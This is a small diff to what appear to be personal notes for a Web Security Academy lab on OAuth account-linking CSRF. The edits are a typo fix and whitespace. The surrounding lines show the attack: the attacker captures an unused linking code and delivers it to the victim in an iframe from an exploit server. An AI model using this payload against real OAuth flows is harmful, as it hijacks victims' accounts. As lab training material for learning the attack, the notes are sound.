@@ -19,10 +19,10 @@ POST /interaction/lMrQMRW49_-i8SN8Djg7B/login HTTP/2
 username=wiener&password=peter
 
 GET /oauth-linking?code=vSuvERBz1YqkyOcYUQqMX-5px7Trvf-M7Qqg28un_vt HTTP/2
-copy this UR code and drop the request
+copy this URL code and drop the request
 https://0a8000e003d2435384c40f49006b00d9.web-security-academy.net/oauth-linking?code=8tqX-w1IEhbwRXFhSWtKkiWEcIra4PHKxvq2rQA8aNZ
 
-log out 
+log out  
 
 2) deliver this from exploit server
 <iframe src="https://0a8000e003d2435384c40f49006b00d9.web-security-academy.net/oauth-linking?code=8tqX-w1IEhbwRXFhSWtKkiWEcIra4PHKxvq2rQA8aNZ">
